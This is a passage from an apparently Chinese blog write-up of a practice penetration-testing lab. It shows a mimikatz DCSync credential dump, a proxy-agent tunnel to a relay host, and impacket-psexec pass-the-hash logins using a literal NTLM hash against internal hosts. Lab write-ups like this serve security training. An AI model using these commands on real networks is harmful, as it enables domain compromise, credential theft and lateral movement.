+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell mimikatz.exe &#34;lsadump::dcsync /csv /domain:cyberstrikelab.com /dc:WIN-7NRTJO59O7N.cyberstrikelab.com /user:administrator /authuser:WIN-7NRTJO59O7N$ /authpassword:\&#34;\&#34; /authntlm&#34; &#34;exit&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/cyber-lab4/image-20260113193032232.png"
+	width="1549"
+	height="218"
+	srcset="/p/cyber-lab4/image-20260113193032232_hu_56efcaa08922e748.png 480w, /p/cyber-lab4/image-20260113193032232_hu_cf3d87a9d8a0beac.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260113193032232"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="710"
+		data-flex-basis="1705px"
+	
+></p>
+<p>然后就直接打pth就行了（前面都不需搭代理，这里需要搭一下）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">./linux_x64_admin -l 172.16.233.2:8000 -s 123
+</span></span><span class="line"><span class="cl">win_agent.exe -c 172.16.233.2:8000 -s 123 --reconnect 8
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">proxychains4 impacket-psexec -hashes :00f995cbe63fd30411f44d434b8dac98 cyberstrikelab.com/administrator@192.168.20.20
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/cyber-lab4/image-20260113193431134.png"
+	width="1123"
+	height="528"
+	srcset="/p/cyber-lab4/image-20260113193431134_hu_3e7b7c571999b795.png 480w, /p/cyber-lab4/image-20260113193431134_hu_a60155ba2588432c.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260113193431134"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="212"
+		data-flex-basis="510px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">proxychains4 impacket-psexec -hashes :00f995cbe63fd30411f44d434b8dac98 cyberstrikelab.com/administrator@192.168.20.30
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/cyber-lab4/image-20260113193518966.png"
+	width="1080"
+	height="531"
+	srcset="/p/cyber-lab4/image-20260113193518966_hu_c19f7ca82bb32262.png 480w, /p/cyber-lab4/image-20260113193518966_hu_aa07f6d0f4a3ccb.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260113193518966"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="203"
+		data-flex-basis="488px"
+	
+></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/emo/">Emo</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>谢谢观看</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/cyber-lab8/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">cyber-lab8</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/cyber-lab6/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">cyber-lab6</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/cyber-lab7/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">cyber-lab7</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/cyber-lab5/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">cyber-lab5</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/cyber-lab2/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">cyber-lab2</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <script src="https://utteranc.es/client.js" 
+        repo=""
+        issue-term="pathname"
+        
+        crossorigin="anonymous"
+        async
+        >
+</script>
+
+<style>
+    .utterances {
+        max-width: unset;
+    }
+</style>
+
+<script>
+    let utterancesLoaded = false;
+
+    function setUtterancesTheme(theme) {
+        let utterances = document.querySelector('.utterances iframe');
+        if (utterances) {
+            utterances.contentWindow.postMessage(
+                {
+                    type: 'set-theme',
+                    theme: `github-${theme}`
+                },
+                'https://utteranc.es'
+            );
+        }
+    }
+
+    addEventListener('message', event => {
+        if (event.origin !== 'https://utteranc.es') return;
+
+        
+        utterancesLoaded = true;
+        setUtterancesTheme(document.documentElement.dataset.scheme)
+    });
+
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (!utterancesLoaded) return;
+        setUtterancesTheme(e.detail)
+    })
+</script>
+
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2025 - 
+        
+        2026 luokaihong
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
